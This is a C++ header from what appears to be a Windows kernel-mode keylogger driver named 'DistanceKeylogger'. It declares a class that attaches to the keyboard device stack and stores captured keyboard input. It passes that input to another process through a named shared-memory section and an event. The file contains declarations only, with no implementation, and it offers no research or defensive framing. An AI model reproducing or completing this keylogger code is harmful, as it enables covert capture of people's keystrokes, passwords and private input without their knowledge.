#ifndef _DISTANCE_KEYLOGGER_CORE_HPP_
#define _DISTANCE_KEYLOGGER_CORE_HPP_

#include <ntddk.h>
#include <wdm.h>
#include <ntddkbd.h>
#include "runtime.hpp"

extern "C" NTSYSAPI NTSTATUS ZwCreateEvent(
    PHANDLE            EventHandle,
    ACCESS_MASK        DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    EVENT_TYPE         EventType,
    BOOLEAN            InitialState
);

extern "C" NTSYSAPI NTSTATUS ZwSetEvent(
    HANDLE EventHandle,
    PLONG  PreviousState
);

typedef USHORT SECURITY_DESCRIPTOR_CONTROL, * PSECURITY_DESCRIPTOR_CONTROL;
typedef struct _SECURITY_DESCRIPTOR {
    UCHAR                       Revision;
    UCHAR                       Sbz1;
    SECURITY_DESCRIPTOR_CONTROL Control;
    PSID                        Owner;
    PSID                        Group;
    PACL                        Sacl;
    PACL                        Dacl;
} SECURITY_DESCRIPTOR, * PISECURITY_DESCRIPTOR;


namespace
{
    IO_WORKITEM_ROUTINE SetEventWorkItem;
}



class KeyloggerCore : public NonPagedMemory
{
public:
    KeyloggerCore(PDRIVER_OBJECT DriverObject);
    ~KeyloggerCore();

    NTSTATUS CreateDevice();
    NTSTATUS AddtachToDevice();
    NTSTATUS InitWorkItem();

    void SetEvent();
    void InitEvent(PVOID Event);
    [[nodiscard]] PKEVENT getEvent() const;

    NTSTATUS OpenSection();
    NTSTATUS CloseSection() const;

    [[nodiscard]] PVOID getSectionBaseAddr() const;

    void saveKeyboardInfo(PKEYBOARD_INPUT_DATA info);
    PKEYBOARD_INPUT_DATA getKeyboardInfo();

    PUNICODE_STRING getDriverName();
    PUNICODE_STRING getSymbolicName();

    [[nodiscard]] PDRIVER_OBJECT getDriverObject() const;
    [[nodiscard]] PDEVICE_OBJECT getDeviceObject() const;
    [[nodiscard]] PDEVICE_OBJECT getLowerDeviceObject() const;

private:
    PDRIVER_OBJECT DriverObject_;

    PDEVICE_OBJECT LowerDeviceObject_;
    PDEVICE_OBJECT DeviceObject_;

    PIO_WORKITEM workItem_;

    PKEVENT Event_;
    HANDLE SectionHandle_;

    PVOID sectionBaseAddress_;
    SIZE_T sectionViewSize_;

    KEYBOARD_INPUT_DATA keyboardInfo_;

    UNICODE_STRING deviceName_ = RTL_CONSTANT_STRING(L"\\Device\\DistanceKeylogger");
    UNICODE_STRING symbolicName_ = RTL_CONSTANT_STRING(L"\\??\\DistanceKeylogger");
    UNICODE_STRING sectionName_ =
        RTL_CONSTANT_STRING(L"\\BaseNamedObjects\\DistanceKeyloggerSharedSection");
};

#endif // _DISTANCE_KEYLOGGER_CORE_HPP_